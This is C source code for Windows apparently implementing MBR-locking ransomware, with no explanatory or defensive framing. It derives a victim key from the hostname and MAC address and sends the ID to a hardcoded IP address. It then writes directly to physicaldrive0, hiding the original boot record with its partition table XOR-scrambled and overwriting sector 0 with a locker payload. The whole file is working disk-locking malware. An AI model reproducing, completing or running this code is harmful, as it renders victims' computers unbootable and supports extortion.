#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <time.h>
#include "bin.h"
#include "md5.h"
#include "info.h"
#include "socket.h"
#define cryptFlag 445

int ReadDisk(int Id,int num,unsigned char *buffer);
int WriteDisk(int Id,int num,unsigned char *buffer);
int getID(char *buffer);
int getmd5(unsigned char *buffer,char *key);
void write(char *buffer);
void send_init(struct ID *p,char *recv_buf);



int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int  nShowCmd){
	char keys[256] = {0};
	char n[6] = "XXXXX";
	char recv_buf[4096];
	unsigned char mbr[512] = {0};
	unsigned char len;
	char keymd5[256] = {0};
	char doman[200] = {0};
	int i = 0;
    getID(doman);
    strncpy((char*)lock_disk+345,doman,17);
    getmd5((unsigned char*)doman,keymd5);
    puts(keymd5);
    memset(doman,0,200);
    strncpy(doman,keymd5,15);
    srand(time(0));
    n[0] = rand()%10+'0';
    id.NO = n[0];
    printf("%s %c\n",id.name,id.NO);
    strcat(doman,n);
    puts(doman);
    getmd5((unsigned char*)doman,keymd5);
    puts(keymd5);

    //return 0;
    write(keymd5);
    send_init(&id,recv_buf);
    //system("pause");
	GetPrivateProfileStringA("locker","psw","left",keys,256,".\\Config.ini");
	len = strlen(keys);
	if(len == 0||len >= 50){
		MessageBox(NULL,"error0-18","Error",MB_OK|MB_ICONERROR);
		exit(-1);
	}
	byte XResult = 0;
	for(i = 0;i<len;i++)
		XResult^=keys[i];

	if(0 == ReadDisk(0,1,mbr)){
		MessageBox(NULL,"Read MBR Error!","Error",MB_OK|MB_ICONERROR);
		exit(-1);
	}
	if(0x16 == mbr[cryptFlag]){
		MessageBox(NULL,"Do not lock again!","Error",MB_OK|MB_ICONERROR);
		exit(-1);
	}
	mbr[cryptFlag] = 0x16;
	for(i = 0;i<64;i++)
		mbr[446+i]^=XResult;
	WriteDisk(2,1,mbr);
	memcpy(lock_disk+cryptFlag,mbr+cryptFlag,67);
	WriteDisk(0,1,lock_disk);
	MessageBoxA(NULL,"OK!","SUCEESS",MB_OK);
	return 0;
}

int ReadDisk(int Id,int num,unsigned char *buffer){

	HANDLE hFile = NULL;
	int offset = 0;
	int ReadSize = 0;
	DWORD Readed = 0;
	offset = Id*512;
	ReadSize = num*512;
	if(NULL == buffer){
		return ReadSize;
	}
	hFile = CreateFileA("\\\\.\\\\physicaldrive0",
				GENERIC_READ,
				FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile == INVALID_HANDLE_VALUE){
		MessageBoxA(NULL,"Can't open disk","Error",MB_OK|MB_ICONERROR);
		return 0;
	}
	SetFilePointer(hFile,offset,0,0);
	ReadFile(hFile,buffer,ReadSize,&Readed,NULL);
	CloseHandle(hFile);
	return Readed;
}

int WriteDisk(int Id,int num,unsigned char *buffer){

	HANDLE hFile = NULL;
	int WriteSize = 0;
	int offset = 0;
	DWORD Writed = 0;
	offset = Id*512;
	WriteSize = num*512;
	if(NULL == buffer){
		return WriteSize;
	}

	hFile = CreateFileA("\\\\.\\\\physicaldrive0",1073741824,1,0,3,128,0);
	if(hFile == INVALID_HANDLE_VALUE){
		MessageBoxA(NULL,"无法打开磁盘","Error",MB_OK|MB_ICONERROR);
		return 0;
	}
	SetFilePointer(hFile,offset,0,0);
	WriteFile(hFile,buffer,WriteSize,&Writed,0);
	CloseHandle(hFile);
	return WriteSize;
}

int getID(char *buffer){
    char host[600] = {0},mac[40] = {0};
    gethost(host);
    getMac(mac);
    strcat(host,mac);
    strcpy(buffer,host);
    strcpy(id.name,buffer);
    return strlen((char*)buffer);
}

int getmd5(unsigned char *buffer,char *key){
    MD5_CTX md5;
    MD5Init(&md5);
    int i;
    //unsigned char encrypt[] ="ALICK000C29FBA6C3";//21232f297a57a5a743894a0e4a801fc3
    unsigned char decrypt[16];
    MD5Update(&md5,buffer,strlen((char *)buffer));
    printf("%d\n",strlen((char *)buffer));
    //puts((char*)buffer);
    MD5Final(&md5,decrypt);
    sprintf(key,"%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x"\
           ,decrypt[0],decrypt[1],decrypt[2],decrypt[3]\
           ,decrypt[4],decrypt[5],decrypt[6],decrypt[7]\
           ,decrypt[8],decrypt[9],decrypt[10],decrypt[11]\
           ,decrypt[12],decrypt[13],decrypt[14],decrypt[15]);
    return strlen(key);
}

void write(char *buffer){
    char p[500] = {0};
    strcpy(p,"[locker]\npsw=");
    strcat(p,buffer);
    FILE *fp = fopen(".\\Config.ini","w+");
    fwrite(p,strlen(p),1,fp);
    fclose(fp);
}

void send_init(struct ID *p,char *recv_buf){
    char rev[6] = "XXXXX";
    rev[0] = p->NO;
    char **buf;
    *(buf) = (char*)malloc(20);
    *(buf+1) = (char *)malloc(20);
    *(buf+2) = (char *)malloc(20);
    memset((*buf),0,20);
    memset((*buf+1),0,20);
    memset((*buf+2),0,20);
    *(buf+3) = (char*)0;
    memset(recv_buf,0,4096);
    strcpy(buf[0],p->name);
    strcpy(buf[1],rev);
    strcpy(buf[2],"OK");//= {p->name,rev};
    Send_Sock("192.168.35.129",buf,3,recv_buf,4096);
}
